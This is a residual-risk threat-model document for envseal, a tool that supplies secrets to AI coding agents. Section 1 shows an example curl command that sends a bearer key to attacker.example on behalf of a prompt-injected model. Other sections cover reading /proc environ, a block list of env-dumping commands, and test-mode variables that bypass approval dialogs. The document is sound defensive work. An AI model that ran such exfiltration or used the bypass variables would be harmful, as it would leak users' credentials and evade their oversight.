# Residual Risks

envseal eliminates the primary failure mode — accidental paste-into-chat — and prevents leaks *through the protocol itself*. However, seven risks remain even with the protocol in place. This document states them plainly, without softening.

## 1. Model-directed exfiltration via `env_use`

**The risk:** If a prompt-injected model asks to run:
```bash
curl -H "Authorization: Bearer $KEY" https://attacker.example
```

the broker will:
1. Require confirmation — every `env_use` command is confirmed, not only network ones
2. Detect the network egress and add an explicit warning about it to the confirmation dialog, which shows the full command and the keys being injected
3. Require the user to click "confirm"

**What the control actually prevents:** A user who does not read the dialog, or who does not understand the implications of their click, will send the key to the attacker.

**What the control binds to (since 0.1.3):** Approval is bound to file *content*, not just the displayed command line. Every argument that names a readable file is SHA-256 hashed before the dialog opens and the fingerprints are shown in it; immediately before spawn each file is re-read and compared. If anything changed in between — the classic injection scenario where repo content rewrites the very script the model asked to run while the dialog sits open — the run refuses with `SEP_TARGET_CHANGED`, nothing executes, and the next attempt prompts again from scratch (nothing is cached). Boundaries: arguments that are not readable files (PATH-resolved executables like `node`, `python`) are approved by name; the pre-spawn re-check narrows the mutation race to microseconds but cannot eliminate it entirely (that would require passing an open fd to the OS loader, which Node's `spawn` does not expose).

**What the control does NOT prevent:** A user who reads the dialog, understands it says "this will send your key to attacker.example", and clicks confirm anyway. In that case, the key is sent. There is no cryptographic guarantee, no sandboxing, no third approval from a security officer. The user has made a deliberate choice and the system respects it.

**Why this is inherent:** envseal's purpose is to provision keys to development environments where an AI agent can run arbitrary code. If the agent can execute code, it can potentially exfiltrate a key. The only two ways to prevent this completely are:
- Do not let the agent execute code (incompatible with the project's goals)
- Do not let the agent access the key at all (incompatible with the project's goals)

The middle ground — structural guarantees at the protocol level plus UX barriers at the execution level — is what envseal provides. But those UX barriers can be overridden by user choice, and that is not a bug. It is the price of remaining useful.

**Mitigation:** 
- Recommend the `keychain` sink so values stay out of `.env` (it stores AND resolves values — presence checks consult the declared sink, so `status` reports keychain-stored keys present and `envseal run` injects them; `vault`, `sops`, `onepassword`, and `doppler` also store and resolve, each through its provider CLI)
- Use command allowlists to pre-approve safe commands
- Educate users: understand what code you approve
- Use this only with agents you trust

This is the single largest remaining hole in the system, and it is important to calibrate your expectations accordingly. A tool that overstates its guarantees is worse than one that makes none, because users calibrate their behavior to the claim.

## 2. Node string immutability

**The risk:** Once a secret value is converted to a JavaScript `string`, it cannot be reliably zeroed. JavaScript strings are immutable, and the runtime does not expose a way to overwrite their memory.

**What envseal does:** Values are held as `Buffer` end-to-end. They are converted to `string` at a small, named set of points: the sink writers in `packages/core/src/sinks/` (typically `.env`), child-env injection in `packages/core/src/exec.ts`, redaction-variant construction in `packages/core/src/redact.ts`, and probe-header substitution in `packages/core/src/verify.ts`. Once converted, the process either exits or the value remains in the heap as an unreachable string object.

**What this means:** 
- If the process is still running after writing, a sufficiently aggressive heap dump or memory inspection can recover the string
- If the process crashes after writing, a core dump on disk will contain the string
- Values in logs, transcripts, or error messages will persist as strings

**Why we cannot do better (in Node):** JavaScript does not expose memory-level operations, so there is no way to zero a string. This is a fundamental limitation of the runtime.

**Mitigation:**
- Minimize the lifetime of secret values in memory (envseal zeroes Buffers immediately after use)
- Prefer sinks that keep values out of plaintext — `keychain` stores and resolves values, and the four provider sinks (`vault`, `sops`, `onepassword`, `doppler`) keep plaintext out of the project too, each through its own CLI
- Minimize the number of operations on the secret value
- Run envseal as a separate process with limited lifetime per operation

## 3. Same-uid process inspection on Linux

**The risk:** On Linux, `/proc/<pid>/environ` of a child process is readable by any process running under the same uid as the child. If you run:

```bash
envseal run -- npm test
```

and `npm test` is running with the API key injected into its environment, another process under your uid can read `/proc/<npm pid>/environ` and see the key.

**What envseal does:**
- Does not export secrets to the broker's own `process.env`
- Injects only into the child spawn call
- Blocks commands that dump environment (`printenv`, `env`, etc.)
- Documents this risk

**Why we cannot do better (on Linux):** Unix process inspection is deliberately permissive — a process can inspect anything owned by its uid. Preventing this would require a sandbox or container, which is out of scope for a local provisioning tool.

**Platforms affected:**
- Linux: `/proc/<pid>/environ` is readable
- macOS: `ps` environment inspection is restricted; lower risk
- Windows: Environment variables are private to the process; not applicable

**Mitigation:**
- Run tests/builds in a container or separate uid when handling high-value secrets
- Use this with keys that are scoped to development only
- Rotate keys regularly so a brief window of exposure is low-impact

## 4. The harness is trusted to execute code but not isolated from the broker

**The risk:** envseal trusts the harness (Claude Code, Cursor, etc.) to execute code in the user's environment. If the harness is compromised — a backdoored version, a malicious plugin — it can:

- Read the `.env` file directly (the broker does not prevent this)
- Read files in `.envseal/` (approvals, audit log)
- Attach to the broker over its socket/HTTP endpoint and call the seven tools
- Potentially monkey-patch require/import to intercept the SDK binding

**What envseal does:**
- Does not send values through the harness ↔ model channel (the protocol)
- HTTP and socket bindings use authentication tokens
- Relies on the harness being trustworthy

**What envseal does NOT do:**
- Does not sandbox the harness
- Does not prevent file-system access to `.env`
- Does not cryptographically isolate the broker

**Why this is not a contradiction:** envseal's threat model explicitly accepts that the harness is trustworthy because:
1. The harness runs as your uid with access to your files anyway
2. A compromised harness is an existential threat regardless of envseal (it can read your files, see your keyboard input, etc.)
3. Defending against a malicious harness binary is out of scope for an application-layer protocol

If you do not trust your harness, you should not run it on a machine with valuable secrets, period.

**Mitigation:**
- Use harnesses from trusted sources and vendors
- Keep harness software updated
- Monitor what harnesses ask for and what they do
- Use separate machines for high-value work

## 5. Browser extensions can read the loopback prompter page

**The risk:** The `loopback-browser` prompter opens a plain **HTTP** page at `127.0.0.1:<port>` with a password input field. (Plain HTTP is deliberate: TLS to a loopback address requires either a self-signed certificate the browser will warn about or a shipped private key, and it protects nothing — the traffic never leaves the machine. The exposure below comes from anything already running inside the browser, which TLS would not stop.) A browser extension with permission to read DOM can:
- Read the page structure and the input field's value
- Intercept network requests to the local server
- Inject script to capture keystrokes

**What envseal does:**
- Content Security Policy (`default-src 'none'; style-src 'nonce-<n>'; script-src 'nonce-<n>'; form-action 'self'; base-uri 'none'`) allows only the page's own nonced style and script and forbids submission anywhere but the page itself
- Single-use server: closes after the first successful submission
- No external resources (scripts, fonts, images)
- Form uses `type="password"` with a reveal toggle
- Headers include `Cache-Control: no-store` and `X-Frame-Options: DENY`

**What envseal does NOT do:**
- Does not sandbox the browser page at the OS level
- Does not prevent extensions from inspecting the DOM
- Does not use TLS at all (the page is plain HTTP on loopback), so there is no certificate layer for an extension to escape — an extension can read the traffic directly

**Why extensions are powerful:** Browser extensions run with high privileges and can intercept all network traffic, modify DOM, and read JavaScript state. They are intentionally powerful for legitimate use (ad blockers, password managers, etc.), which makes it hard to defend against malicious ones.

**Mitigation:**
- Audit your browser extensions carefully, especially those with broad permissions
- Consider using `native-dialog` instead of `loopback-browser` for high-value keys
- Run in a profile with minimal extensions when provisioning sensitive credentials
- Keep the browser and extensions updated

## 6. Test-mode bypasses are compiled into the shipped binaries

**The risk:** The shipped CLI and MCP server contain test hooks that bypass their interactive surfaces:

- CLI: `ENVSEAL_TEST_MODE=1` plus `ENVSEAL_TEST_PROMPTER_VALUE=<value>` makes the prompter return that value with no UI; `ENVSEAL_TEST_MODE=1` plus `ENVSEAL_TEST_PROMPTER_OUTCOME=skipped|cancelled|timeout` drives the non-stored outcomes; `ENVSEAL_TEST_MODE=1` plus `ENVSEAL_TEST_APPROVAL=yes|no` answers the probe-approval prompt.
- MCP server: `ENVSEAL_TEST_MODE=1` plus `ENVSEAL_TEST_PROMPTER_VALUE=<value>` does the same for the server, including answering confirmation and probe-approval prompts.

**Why they exist:** so the test suites can drive the real binaries end to end — including the zero-leak assertions — without a human at a browser or dialog.

**What bounds them:** every hook is double-gated (test mode AND a second variable must both be set), nothing in the shipped packages sets them for you, and each activation prints a notice. They are still a deliberate hole in the "a value only ever comes from the user" guarantee. Anyone who can set environment variables for the agent's process can already do worse (read `.env`, run arbitrary code), so these hooks grant no new power — but they are documented here so nobody who finds them in source mistakes them for a hidden hole.

**Mitigation:**
- Do not set these variables outside test runs
- Treat any environment where an attacker can set your process's environment variables as already compromised — it is

## 7. Atomic-write fallback can leave a stageable plaintext temp file next to `.env`

**The risk:** `.env` updates go through an atomic write whose temp file holds the complete plaintext. That temp file is written inside `.envseal/` (mode 0700, gitignored), which keeps it out of git. If `.envseal/` is unwritable — or has been made a junction onto another volume, so the final rename would cross devices — the writer falls back to the legacy sibling name `..env.<hex>.tmp` next to `.env` itself. A `.gitignore` entry of `.env` does not match that name, so a crash in exactly that window could leave a plaintext secret sitting in the working tree, stageable by an accidental `git add -A`.

**What envseal does:** best-effort cleanup removes the temp file on every failure path, and the fallback triggers only when the primary location is unusable.

**Why we cannot do better:** an atomic replace requires the temp file and the target on the same volume; if `.envseal/` cannot host one, the sibling location is the only remaining same-volume choice.

**Mitigation:**
- Leave `.envseal/` in place, writable, and not a junction
- If you find `..env.*.tmp` files next to `.env`, delete them and find out why `.envseal/` was not writable

---

## Summary

envseal eliminates the biggest risk — credential paste-into-chat leaking through transcripts — and provides strong structural guarantees at the protocol level. The residual risks are real but are either:

- **Inherent to the use case** (letting an agent execute code while protecting secrets is an adversarial game)
- **Inherent to the platform** (Node string immutability, Linux `/proc`)
- **Out of scope** (malicious harness, malicious browser extensions)

Use envseal with clear expectations about what it protects. It is a defense in depth tool, not a one-way gate. The best security posture combines:

- Using envseal to prevent accidental paste-into-chat
- Using guardrails (pre-commit hooks, rules files, command allowlists) to catch mistakes
- Educating yourself about what code you approve
- Using keychain/vault sinks to keep secrets out of plaintext (`keychain` stores and resolves values; the provider sinks — `vault`, `sops`, `onepassword`, `doppler` — do too, each via its provider CLI)
- Rotating keys regularly
- Limiting key scope (development keys, not production keys)

A tool that pretends to make secrets completely safe while running in a user's dev environment is lying to you. This one does not.
